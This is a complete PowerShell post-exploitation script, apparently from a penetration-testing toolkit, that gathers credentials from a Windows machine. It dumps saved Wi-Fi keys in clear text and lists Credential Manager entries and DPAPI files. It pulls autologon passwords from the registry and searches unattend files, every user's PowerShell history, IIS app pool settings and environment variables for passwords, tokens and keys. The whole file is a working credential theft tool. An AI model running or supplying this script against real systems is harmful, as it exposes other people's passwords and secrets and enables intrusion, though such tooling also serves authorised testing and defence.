# gather/windows/enum-credentials.ps1 — Credential harvesting from common stores
# Requires: Current user context (some items need admin)
# Read-only: YES
# MITRE ATT&CK: T1555 — Credentials from Password Stores

$ErrorActionPreference = 'SilentlyContinue'

function Sec($n) { Write-Output "`n=== $n ===" }
function Run($c) { Write-Output "PS> $c"; Invoke-Expression $c }

Sec 'CREDENTIAL_MANAGER'
Run 'cmdkey /list'

Sec 'WIFI_PROFILES'
$profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
foreach ($p in $profiles) {
    Write-Output "--- $p ---"
    netsh wlan show profile name="$p" key=clear 2>$null | Select-String "Key Content"
}

Sec 'DPAPI_MASTER_KEYS'
$paths = @(
    "$env:APPDATA\Microsoft\Credentials",
    "$env:LOCALAPPDATA\Microsoft\Credentials",
    "$env:APPDATA\Microsoft\Protect"
)
foreach ($path in $paths) {
    if (Test-Path $path) {
        Write-Output "--- $path ---"
        Get-ChildItem $path -Recurse -Force 2>$null | Select-Object FullName, Length, LastWriteTime
    }
}

Sec 'UNATTEND_SYSPREP_FILES'
$unattendPaths = @(
    "C:\unattend.xml", "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\Unattend\unattend.xml",
    "C:\Windows\system32\sysprep\sysprep.xml",
    "C:\Windows\system32\sysprep\unattend.xml"
)
foreach ($f in $unattendPaths) {
    if (Test-Path $f) {
        Write-Output "[+] FOUND: $f"
        Select-String -Path $f -Pattern "Password|UserName|AdminPassword" 2>$null
    }
}

Sec 'AUTOLOGON'
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$autoUser = (Get-ItemProperty $regPath -Name "DefaultUserName" -ErrorAction SilentlyContinue).DefaultUserName
$autoPass = (Get-ItemProperty $regPath -Name "DefaultPassword" -ErrorAction SilentlyContinue).DefaultPassword
$autoDom = (Get-ItemProperty $regPath -Name "DefaultDomainName" -ErrorAction SilentlyContinue).DefaultDomainName
if ($autoUser) { Write-Output "[+] AutoLogon: $autoDom\$autoUser : $autoPass" }

Sec 'POWERSHELL_HISTORY'
$users = Get-ChildItem "C:\Users" -Directory -Force 2>$null
foreach ($u in $users) {
    $hist = "$($u.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $hist) {
        Write-Output "--- $($u.Name) PS history (last 30) ---"
        Get-Content $hist -Tail 30 2>$null | Select-String -Pattern "pass|secret|token|key|cred|ConvertTo-SecureString"
    }
}

Sec 'IIS_APP_POOL_CREDS'
if (Test-Path "$env:SystemRoot\system32\inetsrv\appcmd.exe") {
    & "$env:SystemRoot\system32\inetsrv\appcmd.exe" list apppool /text:* 2>$null | Select-String "userName|password"
}

Sec 'SCHEDULED_TASK_CREDENTIALS'
Run 'schtasks /query /fo LIST /v | Select-String "TaskName|Run As User" | Select-Object -First 40'

Sec 'ENVIRONMENT_VARIABLES_SECRETS'
Run 'Get-ChildItem env: | Where-Object { $_.Name -match "pass|secret|token|key|api" -and $_.Name -notmatch "^Path$" } | Format-Table Name, Value'
